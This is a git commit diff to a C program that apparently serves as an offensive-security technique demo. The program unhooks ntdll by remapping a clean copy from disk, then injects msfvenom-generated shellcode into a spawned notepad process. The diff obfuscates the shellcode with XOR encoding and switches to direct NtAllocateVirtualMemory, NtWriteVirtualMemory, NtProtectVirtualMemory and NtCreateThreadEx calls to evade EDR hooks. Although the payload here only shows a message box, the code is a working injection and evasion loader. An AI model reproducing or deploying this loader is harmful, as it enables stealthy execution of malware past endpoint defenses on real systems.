dc2bd749b624875c69399639e90e67be8b756f28
Y3A <62646606+Y3A@users.noreply.github.com>
2022-11-03 22:12:36 +0800

    Add files via upload

--- classic_remapping/classic_remapping.c
+++ classic_remapping/classic_remapping.c
@@ -10,43 +10,90 @@
 #define NTD_PATH "C:\\Windows\\System32\\ntdll.dll"
 
 #define warn(x) printf("%s : 0x%08X\n", x, GetLastError()); 
+#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 
 DWORD create_notepad(void);
 BOOL unhook_ntdll(HMODULE ntdll_init, LPVOID ntdll_view);
+
+typedef struct _UNICODE_STRING
+{
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES
+{
+    ULONG           Length;
+    HANDLE          RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG           Attributes;
+    PVOID           SecurityDescriptor;
+    PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+typedef struct _PS_ATTRIBUTE
+{
+    ULONG Attribute;
+    SIZE_T Size;
+    union
+    {
+        ULONG Value;
+        PVOID ValuePtr;
+    } u1;
+    PSIZE_T ReturnLength;
+} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
+
+typedef struct _PS_ATTRIBUTE_LIST
+{
+    SIZE_T       TotalLength;
+    PS_ATTRIBUTE Attributes[1];
+} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
+
+typedef NTSTATUS(NTAPI *NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);
+typedef NTSTATUS(NTAPI *NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);
+typedef NTSTATUS(NTAPI *NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);
+typedef NTSTATUS(NTAPI *NPVM)(
+    IN  HANDLE ProcessHandle,
+    IN OUT PVOID *BaseAddress,
+    IN OUT PULONG RegionSize,
+    IN  ULONG NewProtect,
+    OUT PULONG OldProtect
+);
+
 
 int main(void)
 {
     HANDLE      ntdll = INVALID_HANDLE_VALUE, ntdll_mapping = NULL;
     LPVOID      ntdll_view = NULL;
     HMODULE     ntdll_init = NULL;
-    LPVOID      base;
+    PVOID       base = NULL;
     DWORD       notepad_pid, written;
     HANDLE      process, thread;
+    SIZE_T      bufsz;
+    NTSTATUS    status;
+    ULONG       old;
 
     // msfvenom --platform windows -p windows/x64/messagebox TEXT="shellcode execution" EXITFUNC=thread -f c
     unsigned char buf[327] =
-        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
-        "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
-        "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
-        "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
-        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
-        "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
-        "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
-        "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
-        "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
-        "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
-        "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
-        "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
-        "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
-        "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
-        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
-        "\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
-        "\x85\x2e\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
-        "\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
-        "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
-        "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x73\x68\x65\x6c\x6c"
-        "\x63\x6f\x64\x65\x20\x65\x78\x65\x63\x75\x74\x69\x6f\x6e\x00"
-        "\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00";
+        "\xaf\x1b\xd2\xb7\xa3\xac\xac\xac\xbb\x83\x53\x53\x53\x12\x02\x12\x03\x01\x02\x05\x1b\x62"
+        "\x81\x36\x1b\xd8\x01\x33\x6d\x1b\xd8\x01\x4b\x6d\x1b\xd8\x01\x73\x6d\x1b\xd8\x21\x03\x6d"
+        "\x1b\x5c\xe4\x19\x19\x1e\x62\x9a\x1b\x62\x93\xff\x6f\x32\x2f\x51\x7f\x73\x12\x92\x9a\x5e"
+        "\x12\x52\x92\xb1\xbe\x01\x12\x02\x6d\x1b\xd8\x01\x73\x6d\xd8\x11\x6f\x1b\x52\x83\x6d\xd8"
+        "\xd3\xdb\x53\x53\x53\x1b\xd6\x93\x27\x3c\x1b\x52\x83\x03\x6d\xd8\x1b\x4b\x6d\x17\xd8\x13"
+        "\x73\x1a\x52\x83\xb0\x0f\x1b\xac\x9a\x6d\x12\xd8\x67\xdb\x1b\x52\x85\x1e\x62\x9a\x1b\x62"
+        "\x93\xff\x12\x92\x9a\x5e\x12\x52\x92\x6b\xb3\x26\xa2\x6d\x1f\x50\x1f\x77\x5b\x16\x6a\x82"
+        "\x26\x85\x0b\x6d\x17\xd8\x13\x77\x1a\x52\x83\x35\x6d\x12\xd8\x5f\x1b\x6d\x17\xd8\x13\x4f"
+        "\x1a\x52\x83\x6d\x12\xd8\x57\xdb\x1b\x52\x83\x12\x0b\x12\x0b\x0d\x0a\x09\x12\x0b\x12\x0a"
+        "\x12\x09\x1b\xd0\xbf\x73\x12\x01\xac\xb3\x0b\x12\x0a\x09\x6d\x1b\xd8\x41\xba\x1a\xac\xac"
+        "\xac\x0e\x1a\x94\x92\x53\x53\x53\x53\x6d\x1b\xde\xc6\x49\x52\x53\x53\x6d\x1f\xde\xd6\x7d"
+        "\x52\x53\x53\x1b\x62\x9a\x12\xe9\x16\xd0\x05\x54\xac\x86\xe8\xb3\x4e\x79\x59\x12\xe9\xf5"
+        "\xc6\xee\xce\xac\x86\x1b\xd0\x97\x7b\x6f\x55\x2f\x59\xd3\xa8\xb3\x26\x56\xe8\x14\x40\x21"
+        "\x3c\x39\x53\x0a\x12\xda\x89\xac\x86\x20\x3b\x36\x3f\x3f\x30\x3c\x37\x36\x73\x36\x2b\x36"
+        "\x30\x26\x27\x3a\x3c\x3d\x53\x1e\x36\x20\x20\x32\x34\x36\x11\x3c\x2b\x53";
+
+    for (int i = 0; i < 327; i++)
+        buf[i] = buf[i] ^ 0x53;
 
     ntdll = CreateFileA(NTD_PATH, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (ntdll == INVALID_HANDLE_VALUE) {
@@ -97,7 +144,7 @@ int main(void)
 
     printf("[+] Notepad pid: %d\n", notepad_pid);
 
-    process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, notepad_pid);
+    process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notepad_pid);
     if (!process) {
         warn("OpenProcess fail");
         CloseHandle(ntdll);
@@ -106,9 +153,28 @@ int main(void)
         return 0;
     }
 
-    base = (UINT64)VirtualAllocEx(process, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
-    if (!base) {
-        warn("VirtualAllocEx fail")
+    NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(ntdll_init, "NtAllocateVirtualMemory");
+    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(ntdll_init, "NtWriteVirtualMemory");
+    NCT NtCreateThreadEx = (NCT)GetProcAddress(ntdll_init, "NtCreateThreadEx");
+    NPVM NtProtectVirtualMemory = (NPVM)GetProcAddress(ntdll_init, "NtProtectVirtualMemory");
+
+    bufsz = sizeof(buf);
+
+    status = NtAllocateVirtualMemory(process, &base, 0, &bufsz, MEM_COMMIT, PAGE_READWRITE);
+    if (!NT_SUCCESS(status)) {
+        warn("NtAllocateVirtualMemory fail");
+        CloseHandle(process);
+        CloseHandle(ntdll);
+        CloseHandle(ntdll_mapping);
+        UnmapViewOfFile(ntdll_view);
+        return 0;
+    }
+    
+    bufsz = sizeof(buf);
+
+    status = NtWriteVirtualMemory(process, base, buf, bufsz, NULL);
+    if (!NT_SUCCESS(status)) {
+        warn("NtWriteVirtualMemory fail");
         CloseHandle(process);
         CloseHandle(ntdll);
         CloseHandle(ntdll_mapping);
@@ -116,18 +182,18 @@ int main(void)
         return 0;
     }
 
-    if (!WriteProcessMemory(process, (LPVOID)base, (LPCVOID)buf, sizeof(buf), &written)) {
-        warn("WriteProcessMemory fail");
+    status = NtProtectVirtualMemory(process, &base, &bufsz, PAGE_EXECUTE_READ, &old);
+    if (!NT_SUCCESS(status)) {
+        warn("NtProtectVirtualMemory fail");
         CloseHandle(process);
         CloseHandle(ntdll);
         CloseHandle(ntdll_mapping);
         UnmapViewOfFile(ntdll_view);
-        VirtualFreeEx(process, base, 0, MEM_RELEASE);
         return 0;
     }
 
-    thread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
-    if (thread != NULL) {
+    status = NtCreateThreadEx(&thread, GENERIC_EXECUTE, NULL, process, (LPTHREAD_START_ROUTINE)base, NULL, FALSE, NULL, NULL, NULL, NULL);
+    if (thread) {
         WaitForSingleObject(thread, 500);
         CloseHandle(thread);
     }
@@ -136,7 +202,6 @@ int main(void)
     CloseHandle(ntdll);
     CloseHandle(ntdll_mapping);
     UnmapViewOfFile(ntdll_view);
-    VirtualFreeEx(process, base, 0, MEM_RELEASE);
     return 0;
 }
 
